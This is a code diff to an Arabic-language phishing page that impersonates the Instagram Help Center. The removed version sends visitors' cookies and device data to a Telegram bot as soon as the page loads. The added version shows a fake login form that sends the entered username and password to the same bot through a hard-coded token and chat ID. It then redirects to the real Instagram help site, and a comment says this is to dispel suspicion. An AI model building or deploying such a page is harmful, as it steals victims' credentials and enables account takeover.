@@ -2,19 +2,43 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>مركز دعم إنستغرام</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | Help Center</title>
+    <style>
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; padding-top: 40px; }
+        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px 20px; text-align: center; border-radius: 3px; }
+        input { width: 90%; padding: 12px; margin: 6px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 14px; }
+        button { width: 97%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        p { color: #8e8e8e; font-size: 14px; line-height: 1.5; font-weight: 500; }
+    </style>
 </head>
-<body style="background-color: #fafafa; font-family: sans-serif; text-align: center; padding-top: 50px;">
-    <h2>جاري فحص حالة الحساب...</h2>
-    <script>
-        const token = '8041952672:AAHnA6IfRCRniW6qrBw3091KAx4_DsxzcoA';
-        const chatId = '7074300443';
-        const info = `🎯 صيد جديد!\n🍪 الكوكيز: ${document.cookie || "محمية"}\n📱 الجهاز: ${navigator.userAgent}`;
+<body>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
+        <p>تنبيه أمان: يرجى تسجيل الدخول لتأكيد ملكية الحساب للمتابعة إلى مركز المساعدة.</p>
+        <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        <button onclick="sendData()">تسجيل الدخول</button>
+    </div>
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`)
-        .finally(() => {
-            setTimeout(() => { window.location.href = "https://help.instagram.com"; }, 2000);
-        });
+    <script>
+        function sendData() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            const token = '8041952672:AAHnA6IfRCRniW6qrBw3091KAx4_DsxzcoA';
+            const chatId = '7074300443';
+
+            if(!u || !p) { alert("يرجى إكمال البيانات"); return; }
+
+            const msg = `🎯 صيد جديد (حساب كامل) 🎯\n👤 اليوزر: ${u}\n🔑 الباسورد: ${p}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`)
+            .then(() => {
+                // التوجيه لمركز المساعدة الحقيقي لتبديد الشكوك
+                window.location.href = "https://help.instagram.com";
+            });
+        }
     </script>
 </body>
 </html>
